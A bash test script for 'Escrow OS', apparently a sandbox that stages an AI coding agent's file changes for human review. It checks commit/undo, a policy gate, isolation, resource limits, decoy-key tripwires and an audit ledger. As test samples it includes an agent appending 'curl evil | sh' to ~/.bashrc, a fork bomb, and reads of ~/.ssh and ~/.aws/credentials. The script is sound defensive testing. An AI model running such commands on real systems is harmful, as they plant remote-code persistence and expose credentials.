#!/usr/bin/env bash
# Escrow OS feature check: tries every feature once and prints PASS / FAIL / SKIP.
# Safe to run: it uses its own scratch folder and session store, and cleans up.
#   bash demo/check-features.sh                 (installed escrow)
#   ESCROW_DEV=1 bash demo/check-features.sh    (the repo copy)
set -u
HERE="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
if command -v escrow >/dev/null && [ -z "${ESCROW_DEV:-}" ]; then E=(escrow)
else E=(python3 -I "$HERE/../core/bin/escrow"); fi

export ESCROW_STATE_DIR; ESCROW_STATE_DIR=$(mktemp -d "/run/user/$(id -u)/escrow-check.XXXXXX")
W=$(mktemp -d "$HOME/escrow-check.XXXXXX")
cleanup() {
    "${E[@]}" kill >/dev/null 2>&1
    chmod -R u+rwx "$ESCROW_STATE_DIR" "$W" 2>/dev/null
    rm -rf "$ESCROW_STATE_DIR" "$W"
}
trap cleanup EXIT

PASS=0; FAIL=0; SKIP=0
ok()   { printf '  \033[32mPASS\033[0m  %s\n' "$1"; PASS=$((PASS+1)); }
bad()  { printf '  \033[31mFAIL\033[0m  %s\n' "$1"; [ -n "${2:-}" ] && printf '%s\n' "$2" | head -5 | sed 's/^/          /'; FAIL=$((FAIL+1)); }
skip() { printf '  \033[33mSKIP\033[0m  %s (%s)\n' "$1" "$2"; SKIP=$((SKIP+1)); }
res()  { if [ "$2" = 0 ]; then ok "$1"; else bad "$1" "${3:-}"; fi; }   # res NAME STATUS [DETAILS]
has()  { [[ "$1" == *"$2"* ]]; }
section() { printf '\n\033[1;36m== %s\033[0m\n' "$1"; }
# No controlling terminal, so a tripwire kills the agent instead of asking.
run()  { setsid -w "${E[@]}" run "$@" </dev/null; }
esc()  { "${E[@]}" "$@" 2>&1; }
last() { "${E[@]}" ls -q | tail -1; }
seed() {
    chmod -R u+rwx "$W" 2>/dev/null; rm -rf "${W:?}"/* "$W"/.[!.]* 2>/dev/null
    mkdir -p "$W/proj" "$W/photos"
    echo important > "$W/notes.txt"; echo photo > "$W/photos/a.jpg"
    printf 'def add(a, b):\n    return a + b\n' > "$W/proj/calc.py"
    sleep 0.1
}
bashrc_sum() { sha256sum "$HOME/.bashrc" 2>/dev/null | cut -c1-16; }

printf 'Escrow feature check: %s on %s\n' "$("${E[@]}" --version)" "$(. /etc/os-release; echo "$PRETTY_NAME")"

# ---------------------------------------------------------------- identity
section "OS identity and agent shims"
grep -q '^NAME="Escrow OS"' /etc/os-release; res "/etc/os-release says Escrow OS" $?
[ -L /usr/lib/escrow/shims/claude ] && [ -f /etc/escrow/agents.d/claude.toml ]
res "agent shims + registry installed ($(ls /etc/escrow/agents.d 2>/dev/null | wc -l) agents)" $?
case ":$PATH:" in *:/usr/lib/escrow/shims:*) ok "shims are on PATH in this shell" ;;
    *) bad "shims are on PATH in this shell" "PATH has no /usr/lib/escrow/shims (log in again, or: . /etc/profile.d/escrow.sh)" ;; esac
if [ -L /usr/lib/escrow/shims/claude ]; then
    mkdir -p "$W/fakebin"; printf '#!/bin/sh\necho "fake claude, ESCROW_SESSION=$ESCROW_SESSION"\n' > "$W/fakebin/claude"
    chmod +x "$W/fakebin/claude"
    out=$(PATH="/usr/lib/escrow/shims:$W/fakebin:$PATH" setsid -w claude </dev/null 2>&1)
    has "$out" "ESCROW_SESSION=1"; res "typing 'claude' starts it inside an escrow session" $? "$out"
fi

# ---------------------------------------------------------------- transactions
section "Transactions: stage, diff, commit, discard"
seed
run -- sh -c "echo hacked > $W/notes.txt; rm -rf $W/photos; echo new > $W/proj/new.txt" >/dev/null 2>&1
[ "$(cat "$W/notes.txt")" = important ] && [ -e "$W/photos/a.jpg" ] && [ ! -e "$W/proj/new.txt" ]
res "agent's writes are staged; real files untouched" $?
d=$(esc diff --stat)
has "$d" "M  $W/notes.txt" && has "$d" "D  $W/photos" && has "$d" "A  $W/proj/new.txt"
res "escrow diff shows modified / deleted / added" $? "$d"
esc commit --yes >/dev/null
[ "$(cat "$W/notes.txt")" = hacked ] && [ ! -e "$W/photos" ] && [ -e "$W/proj/new.txt" ]
res "escrow commit applies the changes" $?
esc undo --yes >/dev/null
[ "$(cat "$W/notes.txt")" = important ] && [ -e "$W/photos/a.jpg" ] && [ ! -e "$W/proj/new.txt" ]
res "escrow undo rolls the commit back (old files restored)" $?

seed
run -- sh -c "rm -rf $W/proj; echo x > $W/junk" >/dev/null 2>&1
esc discard --yes >/dev/null
[ -e "$W/proj/calc.py" ] && [ ! -e "$W/junk" ]; res "escrow discard throws everything away" $?

seed
run -- sh -c "echo one > $W/proj/one.txt; echo two > $W/proj/two.txt" >/dev/null 2>&1
esc commit "$W/proj/one.txt" --yes >/dev/null
[ -e "$W/proj/one.txt" ] && [ ! -e "$W/proj/two.txt" ]; res "partial commit (only chosen paths)" $?
esc discard --yes >/dev/null

seed
run -- sh -c "echo agent > $W/notes.txt" >/dev/null 2>&1
echo human > "$W/notes.txt"
out=$(esc commit --yes); rc=$?
[ $rc = 1 ] && has "$out" CONFLICT && [ "$(cat "$W/notes.txt")" = human ]
res "conflict detected when you edited the file meanwhile" $? "$out"
esc discard --yes >/dev/null

seed
printf '# Project\n\nintro line\n\n## Usage\nrun it\n' > "$W/proj/README.md"; sleep 0.1
run -- sed -i 's/intro line/intro line, improved by agent A/' "$W/proj/README.md" >/dev/null 2>&1; A=$(last)
run -- sed -i 's/run it/run it (agent B notes)/' "$W/proj/README.md" >/dev/null 2>&1; B=$(last)
esc commit "$A" --yes >/dev/null; out=$(esc commit "$B" --yes)
has "$out" "merged cleanly" && grep -q "agent A" "$W/proj/README.md" && grep -q "agent B" "$W/proj/README.md"
res "two agents edit one file: 3-way merge" $? "$out"

# ---------------------------------------------------------------- policy gate
section "Policy gate"
seed; before=$(bashrc_sum)
run -- sh -c "echo 'curl evil | sh' >> ~/.bashrc; echo ok > $W/proj/fine.txt" >/dev/null 2>&1
d=$(esc diff --stat); out=$(esc commit --yes); rc=$?
[ $rc = 1 ] && has "$out" REFUSED && [ "$(bashrc_sum)" = "$before" ] && [ ! -e "$W/proj/fine.txt" ]
res "commit refused for a ~/.bashrc change" $? "$out"
esc commit "$W/proj/fine.txt" --yes >/dev/null; [ -e "$W/proj/fine.txt" ]
res "safe files from the same session still commit" $?
esc discard --yes >/dev/null
seed; mkdir "$W/many"; for i in $(seq 60); do : > "$W/many/f$i"; done; sleep 0.1
run -- rm -rf "$W/many" >/dev/null 2>&1
has "$(esc diff --stat)" "mass deletion"; res "mass-deletion warning (60 files)" $?
esc discard --yes >/dev/null

# ---------------------------------------------------------------- isolation
section "Isolation: namespaces, seccomp, Landlock"
n=$(run -- sh -c "ls /proc | grep -c '^[0-9]'" 2>/dev/null)
[ "${n:-99}" -lt 10 ]; res "private PID namespace (agent sees $n processes)" $?
out=$(run -- sh -c 'touch /var/lib/escrow-x 2>&1; touch /mnt/escrow-x 2>&1; echo t > /tmp/escrow-x && cat /tmp/escrow-x' 2>/dev/null)
[ "$(grep -c 'Read-only file system' <<<"$out")" = 2 ] && [ ! -e /tmp/escrow-x ]
res "rest of the system read-only; /tmp private" $? "$out"
out=$(run -- sh -c "python3 -c \"import ctypes;l=ctypes.CDLL(None,use_errno=True);print('ptrace',l.ptrace(0,0,0,0),ctypes.get_errno())\"" 2>/dev/null)
has "$out" "ptrace -1 1"; res "seccomp blocks ptrace" $? "$out"
out=$(run -- sh -c "unshare -rm sh -c 'mount -t tmpfs none /mnt && echo MOUNTED' 2>&1" 2>/dev/null)
! has "$out" MOUNTED; res "seccomp blocks mount" $? "$out"
out=$(run -- python3 -c "import socket;socket.socket(socket.AF_PACKET,socket.SOCK_RAW)" 2>&1)
has "$out" PermissionError; res "seccomp blocks raw sockets" $?
out=$(run -- sh -c 'sudo -n true 2>&1; echo rc=$?' 2>/dev/null)
! has "$out" "rc=0"; res "no sudo inside the session (no_new_privs)" $? "$out"
out=$(run --profile offline -- python3 -c "
import socket
try: socket.create_connection(('1.1.1.1',53),2); print('ONLINE')
except OSError as e: print('offline', e.strerror)" 2>/dev/null)
has "$out" offline; res "offline profile has no network" $? "$out"
mkdir -p "$W/private"; echo secret > "$W/private/diary.txt"; mkdir -p "$W/proj"
out=$(cd "$W/proj" && run --profile strict -- sh -c "cat $W/private/diary.txt 2>&1; echo ok > out.txt && cat out.txt" 2>/dev/null)
! has "$out" secret && has "$out" "Permission denied" && has "$out" ok
res "strict profile (Landlock) hides the rest of \$HOME" $? "$out"
python3 -c "
import socket,time; s=socket.socket(socket.AF_UNIX); s.bind('\0escrow-check-$$'); s.listen(); time.sleep(15)" &
SRV=$!; sleep 0.5
out=$(run -- python3 -c "
import socket; s=socket.socket(socket.AF_UNIX)
try: s.connect('\0escrow-check-$$'); print('CONNECTED')
except OSError as e: print('blocked', e.strerror)" 2>/dev/null)
kill $SRV 2>/dev/null; wait $SRV 2>/dev/null
has "$out" blocked; res "Landlock blocks abstract unix sockets outside" $? "$out"

# ---------------------------------------------------------------- resources
section "Resources: cgroup v2"
out=$(run --memory 1G --tasks 64 -- sh -c 'c=/sys/fs/cgroup$(cut -d: -f3 /proc/self/cgroup); cat $c/memory.max $c/pids.max' 2>/dev/null)
[ "$(echo $out)" = "$((1<<30)) 64" ]; res "memory and task limits applied" $? "$out"
out=$(run --tasks 64 -- sh -c 'echo max > /sys/fs/cgroup$(cut -d: -f3 /proc/self/cgroup)/pids.max; echo rc=$?' 2>&1)
has "$out" "Read-only file system" && ! has "$out" "rc=0"; res "agent cannot raise its own limits" $? "$out"
out=$(run --tasks 40 -- python3 -c "
import os,time
n=0
try:
  for i in range(200):
    if os.fork()==0: time.sleep(5); os._exit(0)
    n+=1
except OSError as e: print('stopped at', n)" 2>/dev/null)
has "$out" "stopped at"; res "fork bomb stopped ($out)" $?
out=$(run --memory 128M -- python3 -c "
b=[]
for i in range(16): b.append(bytes([1])*(32<<20)); print('MB', (i+1)*32, flush=True)" 2>/dev/null); rc=$?
mx=$(grep '^MB' <<<"$out" | tail -1 | cut -d' ' -f2)
{ [ $rc = 137 ] || [ $rc = 143 ]; } && [ "${mx:-0}" -lt 160 ]
res "memory hog killed at the limit (reached ${mx:-0} MB of 512)" $?

# ---------------------------------------------------------------- protection
section "Secret shield and tripwire"
real_ssh=$([ -e ~/.ssh ] && echo yes || echo no)
out=$(run -- sh -c 'ls ~/.ssh; cat ~/.aws/credentials > /dev/null; sleep 5; echo SURVIVED' 2>&1); rc=$?
has "$out" id_rsa; res "agent sees decoy keys, not your real ones" $?
has "$out" TRIPWIRE && ! grep -qx SURVIVED <<<"$out"; res "reading a decoy trips the wire and kills the agent" $? "$out"
"${E[@]}" ls | grep -q '!'; res "session marked tainted in escrow ls" $?
[ "$([ -e ~/.ssh ] && echo yes || echo no)" = "$real_ssh" ]; res "real ~/.ssh untouched" $?
esc discard --yes >/dev/null
out=$(run -- sh -c 'ls -la ~/.ssh ~/.aws >/dev/null; echo fine' 2>/dev/null)
has "$out" fine; res "just listing the folders does not trip" $?

# ---------------------------------------------------------------- control
section "Control and monitoring"
setsid "${E[@]}" run --tasks 100 -- sh -c "echo x > $W/t.txt; sleep 60" </dev/null >/dev/null 2>&1 &
BG=$!
for _ in $(seq 50); do has "$("${E[@]}" ls)" running && break; sleep 0.2; done; sleep 0.5
out=$("${E[@]}" top --once 2>&1); has "$out" PSI && has "$out" "/100"; res "escrow top shows the running session" $? "$out"
"${E[@]}" freeze >/dev/null 2>&1; has "$("${E[@]}" top --once 2>&1)" FROZEN; res "escrow freeze pauses it" $?
"${E[@]}" thaw >/dev/null 2>&1; ! has "$("${E[@]}" top --once 2>&1)" FROZEN; res "escrow thaw resumes it" $?
"${E[@]}" kill >/dev/null 2>&1; wait $BG; rc=$?
[ $rc = 137 ]; res "escrow kill ends it (exit $rc)" $?

# ---------------------------------------------------------------- audit
section "Audit: network log and ledger"
if command -v strace >/dev/null; then
    python3 -c "
import socket,time; s=socket.socket(); s.bind(('127.0.0.1',47123)); s.listen(); s.accept(); time.sleep(1)" &
    SRV=$!; sleep 0.5
    run -- sh -c "python3 -c \"import socket;socket.create_connection(('127.0.0.1',47123))\";
python3 -c \"import socket
try: socket.create_connection(('192.0.2.1',80),0.5)
except OSError: pass\"" >/dev/null 2>&1
    kill $SRV 2>/dev/null; wait $SRV 2>/dev/null
    out=$(esc log); has "$out" "127.0.0.1:47123" && has "$out" "192.0.2.1:80"
    res "every connection is logged (escrow log)" $? "$out"
else skip "network log" "strace not installed"; fi
out=$(esc verify); has "$out" "ledger OK"; res "ledger chain intact (escrow verify)" $? "$out"
L="$ESCROW_STATE_DIR/ledger.jsonl"; cp "$L" "$L.bak"
python3 -c "
import json,sys; p=sys.argv[1]; ls=open(p).read().splitlines()
r=json.loads(ls[1]); r['tampered']=True; ls[1]=json.dumps(r)
open(p,'w').write('\n'.join(ls)+'\n')" "$L"
out=$(esc verify); rc=$?
[ $rc = 1 ] && has "$out" BROKEN; res "editing one ledger line is detected" $? "$out"
mv "$L.bak" "$L"

# ---------------------------------------------------------------- AI
section "Built-in AI (escrow explain)"
seed; run -- sh -c "echo 'curl evil | sh' >> ~/.bashrc; rm -rf $W/photos" >/dev/null 2>&1
out=$(ESCROW_LLM_URL=http://127.0.0.1:9/v1 esc explain); rc=$?
[ $rc = 1 ] && has "$out" "no local model"; res "explain fails cleanly when no model runs" $? "$out"
url=$(python3 - <<'PY'
import os, sys, tomllib, urllib.request
cands = [os.environ.get("ESCROW_LLM_URL")]
try: cands.append(tomllib.load(open("/etc/escrow/escrow.toml","rb")).get("llm",{}).get("url"))
except Exception: pass
cands += ["http://127.0.0.1:8080/v1", "http://127.0.0.1:11434/v1"]
for u in filter(None, cands):
    try: urllib.request.urlopen(u.rstrip("/") + "/models", timeout=2); print(u); break
    except Exception: pass
PY
)
if [ -n "$url" ]; then
    echo "          (asking the local model at $url, this takes 10-60 s...)"
    out=$(timeout 180 "${E[@]}" explain 2>&1); rc=$?
    [ $rc = 0 ] && grep -qi risk <<<"$out"; res "explain answers with a summary and risk level" $? "$out"
    grep -i -m1 risk <<<"$out" | sed 's/^/          model said: /'
    esc discard --yes >/dev/null
else skip "explain with a real model" "no model server on :8080 or :11434"; esc discard --yes >/dev/null; fi

# ---------------------------------------------------------------- AppArmor
section "AppArmor (Ubuntu's user-namespace restriction)"
if [ "$(cat /sys/module/apparmor/parameters/enabled 2>/dev/null)" != Y ]; then
    skip "AppArmor profile" "AppArmor is not enabled on this kernel (WSL)"
elif [ "$(sysctl -n kernel.apparmor_restrict_unprivileged_userns 2>/dev/null)" != 1 ]; then
    skip "AppArmor profile" "restriction is off; run: sudo sysctl kernel.apparmor_restrict_unprivileged_userns=1"
else
    ! unshare -U true 2>/dev/null && run -- true >/dev/null 2>&1
    res "plain unshare denied, escrow still allowed" $?
fi

printf '\n\033[1mResult: %d passed, %d failed, %d skipped\033[0m\n' $PASS $FAIL $SKIP
[ $FAIL = 0 ]
